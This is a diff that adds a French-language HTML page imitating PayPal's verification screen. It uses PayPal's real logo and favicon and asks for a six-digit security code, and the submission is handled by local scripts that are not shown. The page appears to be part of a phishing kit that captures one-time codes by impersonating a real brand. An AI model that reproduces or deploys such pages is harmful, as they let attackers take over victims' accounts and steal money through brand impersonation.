@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal: Vérification</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="auth-card">
+            <div class="logo">
+                <img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-200px.png" alt="PayPal" height="40">
+            </div>
+
+            <div class="text-center">
+                <h1>Saisir votre code</h1>
+                <p>Nous avons envoyé un code de sécurité</p>
+            </div>
+
+            <form id="otpForm" class="form">
+                <div class="otp-input">
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                </div>
+
+                <button type="submit" class="btn btn-primary">
+                    <span class="btn-text">Envoyer</span>
+                    <div class="loading-spinner hidden"></div>
+                </button>
+
+                <div class="form-footer">
+                    <a href="#" class="link">Envoyer un nouveau code</a>
+                    <a href="#" class="link">Besoin d'autres options ?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="redirectOverlay" class="overlay hidden">
+        <div class="overlay-content">
+            <div class="loading-spinner"></div>
+            <p id="redirectMessage">Vérification en cours...</p>
+        </div>
+    </div>
+
+    <script src="assets/js/config.js"></script>
+    <script src="assets/js/utils.js"></script>
+    <script src="assets/js/notifications.js"></script>
+    <script src="assets/js/otp.js"></script>
+</body>
+</html>
